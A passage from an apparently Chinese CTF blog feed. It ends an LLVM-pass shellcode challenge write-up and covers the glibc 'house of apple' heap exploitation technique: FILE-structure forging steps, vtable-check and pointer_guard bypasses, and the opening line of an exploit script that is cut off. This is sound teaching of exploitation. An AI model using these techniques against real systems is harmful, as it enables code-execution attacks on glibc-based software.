class="line">        &#125;</span><br></pre></td></tr></table></figure><p>并且这里根据handle的处理可以看出来是将v30当作结束地址，再看一下比较重要的几个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">_anonymous_namespace_::MBAPass *__fastcall `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">writeMovImm64</span>(</span><br><span class="line">        _anonymous_namespace_::MBAPass *<span class="keyword">this</span>,</span><br><span class="line">        <span class="keyword">int</span> a2,</span><br><span class="line">        __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  _anonymous_namespace_::MBAPass *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  **((_BYTE **)<span class="keyword">this</span> + <span class="number">5</span>) = <span class="number">0x48</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">    *(_BYTE *)(*((_QWORD *)<span class="keyword">this</span> + <span class="number">5</span>) + <span class="number">1LL</span>) = <span class="number">0xBB</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *(_BYTE *)(*((_QWORD *)<span class="keyword">this</span> + <span class="number">5</span>) + <span class="number">1LL</span>) = <span class="number">0xB8</span>;</span><br><span class="line">  result = <span class="keyword">this</span>;</span><br><span class="line">  *(_QWORD *)(*((_QWORD *)<span class="keyword">this</span> + <span class="number">5</span>) + <span class="number">2LL</span>) = a3;</span><br><span class="line">  *((_QWORD *)<span class="keyword">this</span> + <span class="number">5</span>) += <span class="number">10LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里其实就是写shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>test=<span class="string">b&#x27;\x48\xbb\xfe\xdc\xba\x98\x76\x54\x32\x10&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>disasm(test)</span><br><span class="line"><span class="string">&#x27;   0:   48 bb fe dc ba 98 76 54 32 10   movabs rbx, 0x1032547698badcfe&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>但是这里的漏洞点是在handle函数中将this[4]+0xff0当作了结束的位置，所以还存在0x10是我们可写的，所以我们通过借位的思想来书写shellcode</p><p>在正常情况下执行：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220727172355078.png"                      alt="image-20220727172355078"                ></p><p>我们是可以顺利执行结束的</p><p>那如果第二次我们的指令刚好到达0xff0执行完毕就会出现以下情况：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220727172455946.png"                      alt="image-20220727172455946"                ></p><p> 这里就会接着跳转回去，随后我们每次可控的内容只有八个字节，所以后续就是分片的思想通过jmp指令连接起我们的shellcode</p><p>讲两句：这司马难度的shellcode确定是想我们比赛的时候来做吗？</p><p>exp略长，需要的 <a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a> 自取</p><hr><p>参考链接：<a class="link"   href="https://bbs.pediy.com/thread-273119.htm#msg_header_h1_3" >https://bbs.pediy.com/thread-273119.htm#msg_header_h1_3<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简要介绍&quot;&gt;&lt;a href=&quot;#简要介绍&quot; class=&quot;headerlink&quot; title=&quot;简要介绍&quot;&gt;&lt;/a&gt;简要介绍&lt;/h2&gt;&lt;p&gt;首先呢，也是同其他博主一样，copy一下百度对于llvm的介绍：&lt;/p&gt;
&lt;p&gt;LLVM是构架编译器的框架系统，以C++编写</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="llvm pass" scheme="https://cv196082.gitee.io/tags/llvm-pass/"/>
    
  </entry>
  
  <entry>
    <title>house of apple</title>
    <link href="https://cv196082.gitee.io/2022/07/26/house-of-apple/"/>
    <id>https://cv196082.gitee.io/2022/07/26/house-of-apple/</id>
    <published>2022-07-26T10:55:24.000Z</published>
    <updated>2022-07-26T10:56:07.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>在高版本中large bin attack算是为数不多的可以任意地址写堆地址的方法。</p><p>这一利用方式是相较于其他house of 系列来说存在一定差异，它不是直接通过IO_FILE getshell是通过扩大现存的写堆地址漏洞的方式，从而辅佐其他house of 系列。</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol><li>程序从<code>main</code>函数返回或能调用<code>exit</code>函数</li><li>能泄露出<code>heap</code>地址和<code>libc</code>地址</li><li>能使用一次<code>largebin attack</code></li></ol><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>调用链和house of pig一致：</p><p><code>exit</code>=&gt;<code>fcloseall</code>=&gt;<code>_IO_cleanup</code>=&gt;<code>_IO_flush_all_lockp</code>=&gt;<code>_IO_OVERFLOW</code></p><p>首先在vtbale中存在这样一个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="keyword">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* When we come to here this means the user supplied buffer is</span></span><br><span class="line"><span class="comment">     filled.  But since we must return the number of characters which</span></span><br><span class="line"><span class="comment">     would have been written in total we must provide a buffer for</span></span><br><span class="line"><span class="comment">     further use.  We can do this by writing on and on in the overflow</span></span><br><span class="line"><span class="comment">     buffer in the _IO_wstrnfile structure.  */</span></span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">         snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                      / <span class="keyword">sizeof</span> (<span class="keyword">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">                      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                     / <span class="keyword">sizeof</span> (<span class="keyword">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Since we are not really interested in storing the characters</span></span><br><span class="line"><span class="comment">     which do not fit in the buffer we simply ignore it.  */</span></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是将fp转化为_IO_wstrnfile结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_wstrnfile;</span><br></pre></td></tr></table></figure><p>根据上面，如果通过<code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code>判断则会对<code>fp-&gt;_wide_data</code>的<code>_IO_write_base</code>、<code>_IO_read_base</code>、<code>_IO_read_ptr</code>和<code>_IO_read_end</code>赋值为<code>snf-&gt;overflow_buf</code>或者与该地址一定范围内偏移的值，最后对<code>fp-&gt;_wide_data</code>的<code>_IO_write_ptr</code>和<code>_IO_write_end</code>赋值。</p><p>只要控制了<code>fp-&gt;_wide_data</code>，就可以控制从<code>fp-&gt;_wide_data</code>开始一定范围内的内存的值，也就等同于任意地址写已知地址</p><p>不过可以看到在赋值之前会路过这一函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_wsetb (FILE *f, <span class="keyword">wchar_t</span> *b, <span class="keyword">wchar_t</span> *eb, <span class="keyword">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以一般来说需要绕过free函数，所以我们可以控制<code>_flags2=8</code>即可</p><p>随后就是<code>_IO_wstrnfile</code>结构体涉及到其他结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="keyword">char</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_strnfile;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_wstrnfile;</span><br></pre></td></tr></table></figure><p>因为其中存在着其他结构体，最后可以看出来overflow_buf的偏移量位0xf0，那就是在vtable后面</p><p>而<code>struct _IO_wide_data</code>结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="keyword">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最后呢，也就是在调用vtable之前需要绕过的一点是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造方式"><a href="#构造方式" class="headerlink" title="构造方式"></a>构造方式</h3><p>这里我看原创文章的构造描述和他写的demo的构造方式存在一定差异，所以我这里根据下面的demo来描述构造方式：</p><ol><li>首先修改vtable的值为：_IO_wstrn_jumps</li><li>绕过free，修改_flags2的值为8</li><li>修改_IO_write_ptr的值为-1</li><li>最后修改_wide_data的地址为我们的目标地址</li></ol><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>这里修改<code>mp_</code>结构体和<code>global_max_fast</code>就不再赘述，这两者的攻击方式类似，这里重点提一下如何配合house of pig</p><h4 id="与house-of-pig的联用"><a href="#与house-of-pig的联用" class="headerlink" title="与house of pig的联用"></a><strong>与house of pig的联用</strong></h4><p>在我之前的<a href="https://cv196082.gitee.io/2022/02/23/FSOP/">FSOP</a>这篇文章的关于vtable的检验实际上并不完善，其中只提到了检验内部vtable，关于外部vtable的检验没怎么提。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">_IO_vtable_check (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!rtld_active ()</span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里如果我们的flag值等于<code>_IO_vtable_check</code>的值，函数就会立即返回</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220726180958780.png"                      alt="image-20220726180958780"                ></p><p>通过汇编代码可知这里是将<code>IO_accept_foreign_vtables</code>经过<code>PTR_DEMANGLE</code>这样一个函数的变化最后进行比较，而在<a href="https://cv196082.gitee.io/2022/05/17/house-of-emma/">house of emma</a>中这个函数的本质就是上面汇编中显示的循环右移0x11然后与fs:0x30也就是<code>pointer_guard</code>进行异或。所以，如果<code>pointer_guard</code>和<code>IO_accept_foreign_vtables</code>是我们已知的值，我们即可绕过这一判断。最后任意伪造vtable劫持程序执行流即可。</p><h4 id="与house-of-emma联用"><a href="#与house-of-emma联用" class="headerlink" title="与house of emma联用"></a><strong>与house of emma联用</strong></h4><p>相较于上面的需要进行两次任意地址写的情况，这一利用方式算是比较简单，只需要通过house of apple修改<code>pointer_guard</code>的值，随后进行house of emma即可。</p><h2 id="例题演示"><a href="#例题演示" class="headerlink" title="例题演示"></a>例题演示</h2><p>例题使用的方式为house of apple &amp; house of emma</p><p>因为原创已经分析过了，这里就不再分析了，这里主要提一下堆风水即可。</p><p>首先题目申请chunk的size只能申请三种，分别是：key+0x10，key+0x20，2*key+0x10</p><p>并且题目的输入只能输入一次，所以我们需要在修改掉已经在large bin中的chunk的bk_nextsize的指针的同时修改掉即将进入large bin的chunk的内容为我们伪造的IO_FILE结构体。</p><p>所以我们的目标是，有一个指针指向我们已经在large bin中的chunk，并且在这个chunk的内部还存在一个我们即将进入large bin的chunk，并且我们还希望，在修改bk_nextsize之后紧接着就可以修改掉后一个chunk的内容，让我们可控的内容尽可能的多一点。(其实仔细思考一下发现我们完全可以构造成ptr，ptr+0x30效果也是差不多，构造起来还较为简单一点)</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span 